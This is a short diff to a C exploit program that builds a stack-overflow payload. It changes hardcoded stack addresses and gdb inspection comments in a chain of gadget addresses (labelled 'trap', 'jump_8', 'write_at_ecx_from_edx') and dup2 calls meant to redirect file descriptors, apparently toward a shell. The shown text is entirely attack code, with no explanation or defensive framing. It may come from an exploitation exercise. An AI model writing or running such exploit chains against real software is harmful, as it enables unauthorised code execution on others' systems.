@@ -71,7 +71,7 @@ int main(void)
   char dup_arg_seed[] = "\x62\x01\x01\x01";
   // #1 
   char dup_call_3_addr[] = "\x10\x69\xbf\xbf"; // bufr + 499, 
-  char dup_call_arg_addr[] = "\x14\x68\xbf\xbf"; // bufr + 503, 
+  char dup_call_arg_addr[] = "\x14\x69\xbf\xbf"; // bufr + 503, 
   // #2
   char dup_call2_3_addr[] = "\x30\x69\xbf\xbf"; //bufr + 531, 
   char dup_call2_arg_addr[] = "\x34\x69\xbf\xbf"; //bufr + 535, 
@@ -241,9 +241,9 @@ int main(void)
   strcpy(bufr + 483, dup_call3_3_addr);
   strcpy(bufr + 487, write_at_ecx_from_edx); // 0xbbb6b87e
                                             // all 3 dup2 should have proper file descriptor
-  // x/24x 0xbfbf68f0
+  // x/24x 0xbfbf6908
   // ---------------------------------------------------------- call #1 0xbfbf671d
-  strcpy(bufr + 491, trap); // 0xbba9b6e5, location is 0xbfbf68f0
+  strcpy(bufr + 491, trap); // 0xbba9b6e5, location is 0xbfbf6908
   strcpy(bufr + 495, jump_8); // 0xbbb2d3e2
   // 4 byte value 3
   strcpy(bufr + 499, "\x01\x01\x01\x01");
